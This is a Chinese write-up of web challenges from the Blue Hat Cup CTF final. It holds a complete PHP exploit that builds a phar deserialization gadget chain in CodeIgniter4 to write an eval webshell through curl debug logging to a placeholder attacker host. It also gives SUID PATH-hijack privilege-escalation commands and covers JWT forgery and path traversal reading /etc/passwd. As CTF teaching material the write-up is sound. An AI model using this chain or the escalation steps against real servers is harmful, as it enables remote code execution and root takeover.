> 原文链接: https://www.anquanke.com//post/id/252294 


# 蓝帽杯-final WEB题解


                                阅读量   
                                **15505**
                            
                        |
                        
                                                                                    



[![](https://p2.ssl.qhimg.com/t010a6f23ec2aca738a.jpg)](https://p2.ssl.qhimg.com/t010a6f23ec2aca738a.jpg)



## ImageCheck

题目是一个`codeigniter4`的框架，既然是一个MVC框架，因此我们首先先看`upload`和`check`的`controller`

[![](https://p0.ssl.qhimg.com/t01d15438ed8a62da53.png)](https://p0.ssl.qhimg.com/t01d15438ed8a62da53.png)

对文件进行过滤，并且要求文件后缀是图片后缀，当满足条件之后会进行`check`，我们再来看`check`对应的`controller`

[![](https://p5.ssl.qhimg.com/t0146e6c6f0b460da3c.png)](https://p5.ssl.qhimg.com/t0146e6c6f0b460da3c.png)

很明显的一个利用`phar`反序列化的考点，因为`getimagesize`该函数可以触发`phar`反序列化，有了入口点之后我们需要做的就是找一条`gadget chains`

在这里网上已有的反序列化链子是存在的，可以结合`Rogue-mysql`进行任意文件读取和SQL注入，但是CI框架只允许运行在PHP7.2及往上版本，而MySQL恶意服务器文件读取漏洞只能运行在PHP&lt;7.3版本，所以本次漏洞挖掘只可以运行在刚刚好的**PHP7.2.x**

而给出的CI需要运行在PHP 7.3以上的环境，因此这条链子是行不通的，但是爆出来的也只有这一条链子，因此可能需要我们挖掘额外的链子，但是实际上我们是可以借鉴这条链子的，全局搜索`__destruct`方法:

[![](https://p2.ssl.qhimg.com/t01d3ccee6c03800962.png)](https://p2.ssl.qhimg.com/t01d3ccee6c03800962.png)

这里要么寻找`__call()`方法要么来找其他类的`close()`方法，这里我们借鉴`phpggc`给出的链子，来看`MemcachedHanler`的`close()`方法:

```
public function close(): bool
`{`
    if (isset($this-&gt;memcached))
    `{`
         isset($this-&gt;lockKey) &amp;&amp; $this-&gt;memcached-&gt;delete($this-&gt;lockKey);
        if (! $this-&gt;memcached-&gt;quit())
        `{`
            return false;
        `}`
        $this-&gt;memcached = null;
        return true;
    `}`

    return false;
`}`
```

这里又可以调用其他类的`delete`方法，并且传递的一个参数是可控的，因此继续跟进全局搜索其他类的`delete`方法，跟进了很多类中的`delete`方法，最终找到了`CURLRequest`类:

[![](https://p1.ssl.qhimg.com/t0148408ca8445b623b.png)](https://p1.ssl.qhimg.com/t0148408ca8445b623b.png)

在这里`url`参数是可控的，猜想这里是能够进行触发`curl`，不妨先跟进看下:

[![](https://p5.ssl.qhimg.com/t01b879dfb50d532c55.png)](https://p5.ssl.qhimg.com/t01b879dfb50d532c55.png)

调用了`send`方法，继续跟进该方法:

```
public function send(string $method, string $url)
    `{`
        // Reset our curl options so we're on a fresh slate.
        $curlOptions = [];

        if (! empty($this-&gt;config['query']) &amp;&amp; is_array($this-&gt;config['query']))
        `{`
            // This is likely too naive a solution.
            // Should look into handling when $url already
            // has query vars on it.
            $url .= '?' . http_build_query($this-&gt;config['query']);
            unset($this-&gt;config['query']);
        `}`

        $curlOptions[CURLOPT_URL]            = $url;
        $curlOptions[CURLOPT_RETURNTRANSFER] = true;
        $curlOptions[CURLOPT_HEADER]         = true;
        $curlOptions[CURLOPT_FRESH_CONNECT]  = true;
        // Disable @file uploads in post data.
        $curlOptions[CURLOPT_SAFE_UPLOAD] = true;

        $curlOptions = $this-&gt;setCURLOptions($curlOptions, $this-&gt;config);
        $curlOptions = $this-&gt;applyMethod($method, $curlOptions);
        $curlOptions = $this-&gt;applyRequestHeaders($curlOptions);

        // Do we need to delay this request?
        if ($this-&gt;delay &gt; 0)
        `{`
            sleep($this-&gt;delay); // @phpstan-ignore-line
        `}`

        $output = $this-&gt;sendRequest($curlOptions);

        // Set the string we want to break our response from
        $breakString = "\r\n\r\n";

        if (strpos($output, 'HTTP/1.1 100 Continue') === 0)
        `{`
            $output = substr($output, strpos($output, $breakString) + 4);
        `}`

         // If request and response have Digest
        if (isset($this-&gt;config['auth'][2]) &amp;&amp; $this-&gt;config['auth'][2] === 'digest' &amp;&amp; strpos($output, 'WWW-Authenticate: Digest') !== false)
        `{`
                $output = substr($output, strpos($output, $breakString) + 4);
        `}`

        // Split out our headers and body
        $break = strpos($output, $breakString);

        if ($break !== false)
        `{`
            // Our headers
            $headers = explode("\n", substr($output, 0, $break));

            $this-&gt;setResponseHeaders($headers);

            // Our body
            $body = substr($output, $break + 4);
            $this-&gt;response-&gt;setBody($body);
        `}`
        else
        `{`
            $this-&gt;response-&gt;setBody($output);
        `}`

        return $this-&gt;response;
    `}`
```

证实了猜测，确实可以触发curl并且url是可控的，但是即使是能够curl，由于是`phar`反序列化触发的也不会有回显，那如何通过curl的方式来RCE呢？

这里实际上是比较巧妙的使用了PHP `Curl`中的**debug**<br>
举个例子:

```
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'www.baidu.com');
curl_setopt($ch, CURLOPT_VERBOSE, true); // curl debug
curl_setopt($ch, CURLOPT_STDERR, fopen('/tmp/curl_debug.log', 'w+')); // curl debug
curl_exec($ch);
curl_close($ch);
```

这里的关键是`CURLOPT_VERBOSE`设置为`true`，代表开启debug状态后这样就可以将`debug`内容写入`/tmp/curl_debug.log`文件, 其中`CURLOPT_VERBOSE, CURLOPT_STDERR`是`curl dubug`的关键项。

本地测下:

```
&lt;?php
$url = "https://crisprx.top";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_VERBOSE, true); // curl debug
curl_setopt($ch, CURLOPT_STDERR, fopen('ccccrispr.txt', 'w+')); // curl debug
curl_exec($ch);
curl_close($ch);
```

成功写入文件:

[![](https://p0.ssl.qhimg.com/t01e86d0cef73ec824e.png)](https://p0.ssl.qhimg.com/t01e86d0cef73ec824e.png)

这给了我们一定的启发，如果我们在`CURLRequest`类中也能够控制开启debug，并且控制debug的路径，那我们通过可控的url是不是就能写入任意内容了呢?

答案是肯定的，可以看到:

[![](https://p1.ssl.qhimg.com/t0107b50fe404125a4f.png)](https://p1.ssl.qhimg.com/t0107b50fe404125a4f.png)

在该类中存在`$config`配置`curl`，并且默认是`false`,返回到`send`方法:

[![](https://p0.ssl.qhimg.com/t013cc10f19d66d732c.png)](https://p0.ssl.qhimg.com/t013cc10f19d66d732c.png)

这里调用`$this-&gt;setCURLOptions`传递了`$config`配置，跟进该方法:

```
...
// Debug
        if ($config['debug'])
        `{`
            $curlOptions[CURLOPT_VERBOSE] = 1;
            $curlOptions[CURLOPT_STDERR]  = is_string($config['debug']) ? fopen($config['debug'], 'a+') : fopen('php://stderr', 'w');
        `}`
...
```

这里开启了刚才curl debug最关键的两个字段:`CURLOPT_VERBOSE&amp;CURLOPT_STDERR`,并且这里的`$config['debug']`是我们可控的，这样我们可以控制它为`/var/www/html/uploads/shell.php`，这样就可以写入shell了

因此EXP就很好写了:

```
&lt;?php
namespace CodeIgniter\Cache\Handlers`{`
    class RedisHandler`{`
        protected $redis;
        public function __construct($redis)
        `{`
            $this-&gt;redis = $redis;
        `}`
    `}`

`}`

namespace CodeIgniter\Session\Handlers`{`
    class MemcachedHandler`{`
        protected $memcached;
        protected $lockKey;
        public function __construct($memcached)
        `{`
            $this-&gt;lockKey = "http://xxx:3333/?&lt;?=eval(\$_POST[1])?&gt;";
            $this-&gt;memcached = $memcached;
        `}`
    `}`
`}`

namespace CodeIgniter\HTTP`{`
    class CURLRequest`{`
        protected $config = [];
        public function __construct()
        `{`
            $this-&gt;config = [
                'timeout'         =&gt; 0.0,
                'connect_timeout' =&gt; 150,
                'debug'           =&gt; '/var/www/html/public/uploads/shell.php',
                'verify'          =&gt; false,
            ];
        `}`
    `}`
`}`

namespace`{`
    $code = new \CodeIgniter\HTTP\CURLRequest();
    $memcached = new \CodeIgniter\Session\Handlers\MemcachedHandler($code);
    $redis = new \CodeIgniter\Cache\Handlers\RedisHandler($memcached);
    $a = $redis;
    @unlink("phar.phar");
    $phar = new Phar("phar.phar");
    $phar-&gt;startBuffering();
    $phar-&gt;setStub("GIF89a"."&lt;?php __HALT_COMPILER(); ?&gt;"); //设置stub，增加gif文件头
    $phar-&gt;setMetadata($a); //将自定义meta-data存入manifest
    $phar-&gt;addFromString("test.txt", "test"); //添加要压缩的文件
        //签名自动计算
    $phar-&gt;stopBuffering();
`}`
?&gt;
```

最后只需要将生成的phar包进行`gzip`或者`bzip2`压缩后修改后缀为jpg上传后再通过phar触发反序列化写入shell

getshell后发现还需要提权，存在一个readflag文件属性是SUID:

[![](https://p4.ssl.qhimg.com/t01394ee3460ee58336.png)](https://p4.ssl.qhimg.com/t01394ee3460ee58336.png)

其实是一个很经典的环境变量PATH提权，以前在vulnhub的`Bytesec`这个虚拟机里出现过该考点

<strong>该环境变量提权的思路就是：<br>
重新设置环境变量在/tmp目录下，则我们在使用/usr/bin/ls时使用的系统命令会定位到/tmp路径下的ls可执行程序，而内容已被我们篡改，因为ls是SUID权限，即运行时有root权限，所以我们借这个SUID位执行我们设置的ls,即我们以root身份打开了一个/bin/sh，成功提权。</strong>

因此可以构造如下:

```
cd /tmp #只有/tmp目录下可写
echo "/bin/sh" &gt; ls #将/bin/sh写入ls
chmod +x ls #赋予可执行权限给netstat
echo $PATH #查看当前环境变量
export PATH=/tmp:$PATH
```

最后提权root



## web2

这题入口只能说是个脑洞题。。那么久没给hint不知道咋想的，给hint之后能读jwt的`secret_key`，结合之前扫目录发现的`register`路由可以根据POST的`username`来生成对应的token，拿到`secret_key`便能够伪造admin身份了:

[![](https://p4.ssl.qhimg.com/t016d23e2fe50085bae.png)](https://p4.ssl.qhimg.com/t016d23e2fe50085bae.png)

伪造完之后发现可以读取源码:

[![](https://p1.ssl.qhimg.com/t01fd5038f4164fdbd8.png)](https://p1.ssl.qhimg.com/t01fd5038f4164fdbd8.png)

知道还有个`addAdmin`路由，这里可以用该路由将自己注册的用户来`addAdmin`之后便可以登录访问`/admin`路由不然一直卡死，比赛的时候非常迷，总之动不动就会卡死，然后还要一堆涉及到SQL的操作，但其实利用的主要就是`getfile`路由，因为`filename`可控且没有过滤，因此直接可以进行路径穿越读取`/etc/passwd`成功后继续读取`/proc/self/environ`发现根目录貌似是在`root`然后就顺着直接读flag了:

[![](https://p2.ssl.qhimg.com/t01ddc33dcab46e084e.png)](https://p2.ssl.qhimg.com/t01ddc33dcab46e084e.png)
